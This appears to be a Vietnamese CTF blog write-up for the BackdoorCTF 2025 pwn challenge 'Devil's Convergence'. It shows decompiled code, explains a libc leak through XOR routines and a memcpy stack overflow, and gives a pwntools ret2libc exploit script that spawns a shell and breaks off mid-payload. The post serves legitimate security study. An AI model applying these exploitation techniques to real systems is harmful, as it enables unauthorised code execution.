<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Writeup: BackdoorCTF 2025 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup: BackdoorCTF 2025">
<meta property="og:url" content="https://elliotbigfan.github.io/2025/12/08/2025/ctf/backdoorCTF/wu/index.html">
<meta property="og:site_name" content="H00d1eBl4ck">
<meta property="og:description" content="Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/backdoor/logo.png">
<meta property="article:published_time" content="2025-12-08T10:37:33.000Z">
<meta property="article:modified_time" content="2025-12-11T13:08:00.022Z">
<meta property="article:author" content="H00d1eBl4ck">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/backdoor/logo.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Writeup: BackdoorCTF 2025",
  "url": "https://elliotbigfan.github.io/2025/12/08/2025/ctf/backdoorCTF/wu/",
  "image": "https://elliotbigfan.github.io/img/ctf/backdoor/logo.png",
  "datePublished": "2025-12-08T10:37:33.000Z",
  "dateModified": "2025-12-11T13:08:00.022Z",
  "author": [
    {
      "@type": "Person",
      "name": "H00d1eBl4ck",
      "url": "https://elliotbigfan.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2025/12/08/2025/ctf/backdoorCTF/wu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Writeup: BackdoorCTF 2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/backdoor/logo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Writeup: BackdoorCTF 2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Writeup: BackdoorCTF 2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-08T10:37:33.000Z" title="Created 2025-12-08 17:37:33">2025-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-11T13:08:00.022Z" title="Updated 2025-12-11 20:08:00">2025-12-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/BackdoorCTF/">BackdoorCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>32mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Pwn-Challenge-Devil’s-Convergence"><a href="#Pwn-Challenge-Devil’s-Convergence" class="headerlink" title="Pwn | Challenge: Devil’s Convergence"></a>Pwn | Challenge: Devil’s Convergence</h1><h2 id="1-Phan-tich-chuong-trinh"><a href="#1-Phan-tich-chuong-trinh" class="headerlink" title="1. Phân tích chương trình:"></a>1. Phân tích chương trình:</h2><ul>
<li><p>Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:</p>
<ul>
<li><code>initialize</code> : khỏi tạo giá trị cho biến toàn cục <code>contract_seal</code> là địa chỉ libc của hàm <code>system</code> và thực thi các hàm <code>setvbuf</code>.</li>
<li><code>control_manipulation</code>: Encode XOR data người dùng truyền vào <code>buf</code> với <strong>nửa phần đầu</strong> giá trị của biến <code>contract_seal</code>.</li>
<li><code>war_devils_prophecy</code>:  Encode XOR data người dùng truyền vào <code>buf</code> với <strong>nửa phần sau</strong> giá trị của biến <code>contract_seal</code>.</li>
<li><code>bomb_devils_contract</code>: Encode XOR data người dùng truyền vào <code>volatile_mixture = malloc(0x200uLL);</code> với <code>*((_BYTE *)&amp;contract_seal + i % 8)</code> (Hay có thể hiểu: <code>contact_seal[i % 8]</code>).</li>
</ul>
</li>
<li><p>Và ở hàm <code>bomb_devils_contract</code> :</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bomb_devils_contract</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE dest[<span class="number">76</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n[BOMB DEVIL] A cafe worker approaches with a gentle smile...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] Reze: &#x27;Would you like to run away with me?&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] But beneath the kindness lies explosive power...&quot;</span>);</span><br><span class="line">  volatile_mixture = <span class="built_in">malloc</span>(<span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !volatile_mixture )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] Failed to prepare explosive payload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[BOMB DEVIL] Infuse your energy into the contract: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, volatile_mixture, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">511</span>; ++i )</span><br><span class="line">    *((_BYTE *)volatile_mixture + i) ^= *((_BYTE *)&amp;contract_seal + i % <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, volatile_mixture, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="built_in">free</span>(volatile_mixture);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Ta có thể thấy được bug <code>bufferoverflow</code> tại lệnh <code>memcpy(dest, volatile_mixture, 0x200uLL);</code>, <code>dest</code> cho phép chứa tối đa 76 bytes nhưng <code>volatile_mixture</code> lại chứa 0x200 (512) bytes và ta sẽ tận dụng bug này để <code>ret2libc</code> và lấy được flag.</p>
</li>
<li><p>Kế tiếp ta cần phải leak được libc address của chương trình, quan sát 2 hàm <code>control_manipulation</code>, <code>war_devils_prophecy</code>:</p>
</li>
<li><p>Hàm: <code>control_manipulation</code></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">control_manipulation</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[CONTROL DEVIL] Makima&#x27;s gaze pierces through your soul...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[CONTROL DEVIL] She whispers: &#x27;I can see everything about you.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[CONTROL DEVIL] Submit to her control: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    v1[i] = *((_BYTE *)&amp;contract_seal + i) ^ buf[i];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[CONTROL DEVIL] Your dominated essence: &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, v1, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Tại đoạn code:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  v1[i] = *((_BYTE *)&amp;contract_seal + i) ^ buf[i];</span><br></pre></td></tr></table></figure>

<ul>
<li><p>4 bytes đầu của <code>buf</code> đang được xor với 4 bytes đầu của <code>contract_seal</code> mà <code>contract_seal</code> đang chứa địa chỉ libc của system, ta chỉ cần truyền 4 bytes <code>\x00</code> vào buf thì hoàn toàn có thể leak được 4 bytes đầu libc của <code>system</code>. (Tính chất XOR: <code>a ^ 0 = a</code>)</p>
</li>
<li><p>Hàm <code>war_devils_prophecy</code>:</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">war_devils_prophecy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n[WAR DEVIL] Yoru&#x27;s eyes glow with destructive intent&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WAR DEVIL] &#x27;I am War. I will reclaim what Chainsaw Man stole from me.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[WAR DEVIL] Offer your tribute to War: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    v1[i] = *((_BYTE *)&amp;contract_seal + i + <span class="number">4</span>) ^ buf[i];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[WAR DEVIL] Your war essence: &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, v1, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WAR DEVIL] &#x27;Nuclear weapons... the ultimate expression of conflict...&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[WAR DEVIL] &#x27;Soon, war will return to this world.&#x27;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Ở đoạn code:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  v1[i] = *((_BYTE *)&amp;contract_seal + i + <span class="number">4</span>) ^ buf[i];</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Cũng xử lý tương tự như đoạn code ở hàm <code>control_manipulation</code> nhưng XOR với 4 bytes sau của <code>contract_seal</code>, ta cũng chỉ cần gửi 4 bytes <code>\x00</code> là leak được phần sau libc  của <code>system</code>. </p>
</li>
<li><p>Như vậy ta đã có 2 mảng ghép hoàn chỉnh để <code>ret2libc</code> là <code>bufferoverflow</code> và <code>leaked libc</code>.</p>
</li>
<li><p>Cuối cùng ta cần gửi payload được encode XOR hợp lý để RCE thành công, phân tích hàm <code>bomb_devils_contract</code>:</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bomb_devils_contract</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE dest[<span class="number">76</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n[BOMB DEVIL] A cafe worker approaches with a gentle smile...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] Reze: &#x27;Would you like to run away with me?&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] But beneath the kindness lies explosive power...&quot;</span>);</span><br><span class="line">  volatile_mixture = <span class="built_in">malloc</span>(<span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !volatile_mixture )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[BOMB DEVIL] Failed to prepare explosive payload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[BOMB DEVIL] Infuse your energy into the contract: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, volatile_mixture, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">511</span>; ++i )</span><br><span class="line">    *((_BYTE *)volatile_mixture + i) ^= *((_BYTE *)&amp;contract_seal + i % <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, volatile_mixture, <span class="number">512uLL</span>);</span><br><span class="line">  <span class="built_in">free</span>(volatile_mixture);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Ở đoạn code:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">511</span>; ++i )</span><br><span class="line">  *((_BYTE *)volatile_mixture + i) ^= *((_BYTE *)&amp;contract_seal + i % <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>volatile_mixture</code> (chứa dữ liệu người dùng) được xor với <code>contract_seal[i % 8]</code> vậy ta chỉ cần gửi payload kiểu:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encoded = <span class="built_in">bytes</span>([ payload[i] ^ key[i % <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)) ])</span><br></pre></td></tr></table></figure>

<ul>
<li>Chương trình sẽ biến payload của ta trở lại bình thường nhờ tính chất của XOR <code>a ^ b ^ b = a</code></li>
</ul>
<h2 id="2-Script-Python-de-exploit"><a href="#2-Script-Python-de-exploit" class="headerlink" title="2. Script Python để exploit:"></a>2. Script Python để exploit:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chal_chainsawman_patched&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        r = remote(<span class="string">&quot;remote.infoseciitr.in&quot;</span>, <span class="number">8005</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.GDB:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = conn()</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;[CONTROL DEVIL] Submit to her control: &#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;[CONTROL DEVIL] Your dominated essence: &#x27;</span>)</span><br><span class="line">    leak1 = p.recvline().strip()</span><br><span class="line">    log.info(<span class="string">f&quot;leak1: <span class="subst">&#123;<span class="built_in">hex</span>(u32(leak1))&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;[WAR DEVIL] Offer your tribute to War: &#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;[WAR DEVIL] Your war essence: &#x27;</span>)</span><br><span class="line">    leak2 = p.recvline().strip()</span><br><span class="line">    log.info(<span class="string">f&quot;leak2: <span class="subst">&#123;<span class="built_in">hex</span>(u32(leak2))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    key = leak1 + leak2</span><br><span class="line">    contract_seal = u64(leak1 + leak2)</span><br><span class="line">    libc.address = contract_seal - <span class="number">0x58750</span></span><br><span class="line">    log.info(<span class="string">f&quot;Libc system address leak: <span class="subst">&#123;<span class="built_in">hex</span>(contract_seal)&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line">    rop = ROP(libc)</span><br><span class="line">    bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    pop_rdi = rop.rdi.address</span><br><span class="line">    pop_rsi = rop.rsi.address</span><br><span class="line">    pop_rdx = libc.address + <span class="number">0x00000000000b503c</span> <span class="comment"># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">    pop_rax = rop.find_gadget([<span class="string">&#x27;pop rax&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">    syscall = rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">    system = contract_seal</span><br><span class="line">    nop_ret = <span class="number">0x00000000004011cf</span> <span class="comment"># nop ; ret</span></span><br><span class="line">    add_rsp = <span class="number">0x0000000000401016</span> <span class="comment"># add rsp, 8 ; ret</span></span><br><span class="line">    ret = <span class="number">0x000000000040101a</span> <span class="comment"># ret</span></span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&#x27;A&#x27;</span> * <span class="number">88</span>,</span><br><span class="line">        pop_rdi, 